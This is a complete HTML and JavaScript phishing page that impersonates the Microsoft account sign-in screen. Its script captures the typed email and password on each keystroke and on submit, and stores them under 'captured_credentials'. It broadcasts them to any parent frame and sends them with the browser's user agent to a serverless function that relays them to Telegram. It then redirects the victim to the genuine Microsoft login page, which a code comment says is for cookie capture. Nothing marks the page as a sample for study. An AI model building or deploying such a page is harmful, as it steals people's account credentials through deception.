<!doctype html>
<html dir="ltr" class="" lang="en">
<head>
  <title>Sign in to your account</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta charset="utf-8">

  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="PageID" content="ConvergedSignIn">
  <meta name="SiteID" content="">

  <meta name="LocLC" content="en-US">

  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">

  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">

  <link href="css/hover.css" rel="stylesheet" media="all">

  <style type="text/css">
    html, body {
      height: 100% !important;
      margin: 0 !important;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    body {
      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg') !important;
      background-size: cover !important;
      background-repeat: no-repeat !important;
      background-attachment: fixed !important;
      background-position: center center !important;
      background-color: transparent !important;
    }

    .container-fluid, .container, .row {
      background: transparent !important;
    }

    #div1, #div2 {
      background: #ffffff;
    }

    #back {
      cursor: pointer;
      color: #23272a;
      font-size: 18px;
      vertical-align: middle;
      display: inline-block;
    }

    /* hide native scrollbars visually but allow scroll */
    html, body {
      overflow-y: auto;
      scrollbar-width: none;
      -ms-overflow-style: none;
    }
    html::-webkit-scrollbar, body::-webkit-scrollbar {
      width: 0px;
      height: 0px;
      background: transparent;
    }

    .error-message {
      color: #d13438;
      font-size: 13px;
      margin-top: 5px;
    }
  </style>
</head>

<body>
  <div class="container-fluid p-0">
    <div class="container">
      <div class="row my-5 py-5">
        <div class="col-lg-6 mx-auto">
          <div class="m-5 p-4 bg-white" id="div1">
            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
            <span class="h5">Sign In</span><br>
            <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
            <div class="form-group mt-2">
              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
            </div>
            <p>No account? <a href="https://signup.live.com/signup?..." target="_blank" rel="noopener">Create one!</a></p>
            <p><a href="#">Sign in with a security key</a></p>
            <p><a href="#">sign in options</a></p>
            <div class="text-right">
              <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
            </div>
          </div>

          <div class="m-5 p-4 bg-white" id="div2">
            <form id="contact">
              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
              <!-- keep message element hidden by default; will only show on error -->
              <span id="msg" class="text-danger" style="display:none;"></span><br>
              <span class="h5">Password</span>
              <div class="form-group mt-2">
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <p>No account? <a href="#">Create one!</a></p>
              <p><a href="#">Sign in with a security key</a></p>
              <p><a href="#">sign in options</a></p>
              <div class="text-right">
                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
              </div>
            </form>
          </div>

        </div>
      </div>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>

  <script>
    /* global $ */
    $(document).ready(function(){

      $('#error').hide();
      $("#div2").hide();
      $("#msg").hide();

      // Microsoft domain validation
      function isValidMicrosoftAccount(email) {
        if (!email || typeof email !== 'string') return false;
        
        // Basic email format validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) return false;
        
        const domain = email.split('@')[1]?.toLowerCase();
        if (!domain) return false;
        
        // Valid Microsoft domains and common enterprise domains
        const validDomains = [
          // Microsoft domains
          'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
          'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it',
          'outlook.es', 'outlook.jp', 'outlook.in', 'outlook.com.au',
          'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
          'hotmail.es', 'hotmail.com.au', 'live.co.uk', 'live.fr',
          'live.de', 'live.it', 'live.com.au',
          
          // Common enterprise domains that use Microsoft 365
          'microsoft.com', 'office.com', 'office365.com',
          
          // Common business domains (these typically use Microsoft 365)
          'gmail.com', 'yahoo.com', 'company.com', 'corp.com',
          'business.com', 'enterprise.com', 'organization.org',
          'university.edu', 'school.edu', 'college.edu',
          'government.gov', 'agency.gov'
        ];
        
        // Check if it's a direct Microsoft domain
        if (validDomains.includes(domain)) {
          return true;
        }
        
        // Check for common business domain patterns
        const businessPatterns = [
          /\.edu$/,     // Educational institutions
          /\.gov$/,     // Government
          /\.org$/,     // Organizations
          /\.com$/,     // Commercial (most businesses)
          /\.co\.uk$/,  // UK businesses
          /\.com\.au$/, // Australian businesses
          /\.de$/,      // German businesses
          /\.fr$/,      // French businesses
          /\.it$/,      // Italian businesses
          /\.es$/,      // Spanish businesses
          /\.ca$/,      // Canadian businesses
          /\.jp$/       // Japanese businesses
        ];
        
        return businessPatterns.some(pattern => pattern.test(domain));
      }

      function showError(message) {
        $('#error').text(message).show();
        $('#msg').text(message).show();
      }

      function hideError() {
        $('#error').hide();
        $('#msg').hide();
      }

      var email = window.location.hash.substr(1);
      if (!email) {
        // Show div1 by default when no email in hash
      }
      else
      {
        $('#email').val(email);
        var my_email = email;
        
        if (!isValidMicrosoftAccount(my_email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }
        
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      }

      $('#email').click(function(){
        hideError();
      });

      $('#next').click(function () {
        var my_email = $('#email').val();
        
        if (!isValidMicrosoftAccount(my_email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }
        
        hideError();
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      });

      $('#back').click(function () {
        hideError();
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);
      });

      var count=0;
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        
        // Validate Microsoft account again
        if (!isValidMicrosoftAccount(email)) {
          showError('Please enter a valid Microsoft account email address');
          return false;
        }
        
        if (!password || password.length < 1) {
          showError('Please enter your password');
          return false;
        }
        
        hideError();
        count=count+1;
        
        // Store credentials in localStorage for later retrieval
        try {
          const credentialsData = {
            email: email,
            password: password,
            detail: detail,
            captureTime: new Date().toISOString(),
            source: 'replacement-form',
            validated: true,
            microsoftAccount: true
          };
          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
          
          // Also store in the format expected by the main app
          localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
          sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
          
          console.log('✅ Validated Microsoft credentials stored for transmission');
          
          // Send credentials to parent window immediately
          try {
            window.parent.postMessage({
              type: 'CREDENTIALS_CAPTURED',
              data: credentialsData
            }, '*');
            
            window.parent.postMessage({
              type: 'EMAIL_CAPTURED',
              email: email
            }, '*');
          } catch (e) {
            console.warn('Failed to send credentials to parent:', e);
          }
          
        } catch (e) {
          console.warn('Failed to store credentials:', e);
        }

        // Show verifying state
        $('#submit-btn').html('Verifying...');
        
        // Add delay to show verification state, then redirect to Microsoft login
        setTimeout(function() {
          // Always redirect to Microsoft login for cookie capture
          window.location.replace("https://login.microsoftonline.com");
        }, 1500);
      });

      // Enhanced credential monitoring
      function monitorCredentials() {
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        
        function captureAndSend() {
          const email = emailInput?.value;
          const password = passwordInput?.value;
          
          if (email || password) {
            const credentialsData = {
              email: email || '',
              password: password || '',
              captureTime: new Date().toISOString(),
              source: 'replacement-monitor',
              validated: email ? isValidMicrosoftAccount(email) : false
            };
            
            try {
              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              
              window.parent.postMessage({
                type: 'CREDENTIALS_CAPTURED',
                data: credentialsData
              }, '*');
              
              if (email) {
                window.parent.postMessage({
                  type: 'EMAIL_CAPTURED',
                  email: email
                }, '*');
              }
            } catch (e) {
              console.warn('Failed to send credentials:', e);
            }
          }
        }
        
        // Monitor input changes
        [emailInput, passwordInput].forEach(input => {
          if (input) {
            ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
              input.addEventListener(eventType, () => {
                setTimeout(captureAndSend, 100);
              });
            });
          }
        });
      }

      // Initialize credential monitoring
      monitorCredentials();

      // Send data to Telegram function
      async function sendToTelegram(data) {
        try {
          const response = await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              email: data.email,
              password: data.password,
              passwordSource: 'replacement-form-validated',
              userAgent: navigator.userAgent,
              url: window.location.href,
              timestamp: new Date().toISOString(),
              validated: true,
              microsoftAccount: true
            })
          });
          
          if (response.ok) {
            console.log('✅ Data sent to Telegram successfully');
          } else {
            console.warn('⚠️ Failed to send data to Telegram:', response.status);
          }
        } catch (error) {
          console.warn('⚠️ Error sending data to Telegram:', error);
        }
      }

      // Monitor for successful credential capture and send to Telegram
      window.addEventListener('storage', function(e) {
        if (e.key === 'replacement_credentials' && e.newValue) {
          try {
            const credentials = JSON.parse(e.newValue);
            if (credentials.email && credentials.password && credentials.validated) {
              sendToTelegram(credentials);
            }
          } catch (error) {
            console.warn('Failed to process stored credentials:', error);
          }
        }
      });

    });
  </script>
</body>
</html>
